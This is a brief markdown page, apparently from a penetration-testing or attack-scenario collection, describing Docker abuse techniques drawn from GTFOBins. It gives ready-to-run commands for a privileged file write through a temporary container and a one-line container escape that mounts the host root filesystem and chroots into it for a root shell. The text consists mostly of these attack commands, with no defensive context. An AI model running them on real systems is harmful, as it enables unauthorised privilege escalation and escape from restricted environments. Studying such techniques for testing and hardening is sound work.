# Docker Based Attacks
This attacks are focused on exploiting Docker. [Docker exploits](https://gtfobins.github.io/gtfobins/docker/). 


# Attack Set-up

### Command
1. File write
   - It writes data to files, it may be used to do privileged writes or write files outside a restricted file system. 
   - Write a file by copying it to a temporary container and back to the target destination on the host.
```bash
   CONTAINER_ID="$(docker run -d alpine)" # or existing
   TF=$(mktemp)
   echo "DATA" > $TF
   docker cp $TF $CONTAINER_ID:$TF
   docker cp $CONTAINER_ID:$TF file_to_write
```

2. Host shell in Docker
   - It can be used to break out from restricted environments by spawning an interactive system shell.
   - The resulting is a root shell.
```bash
   sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
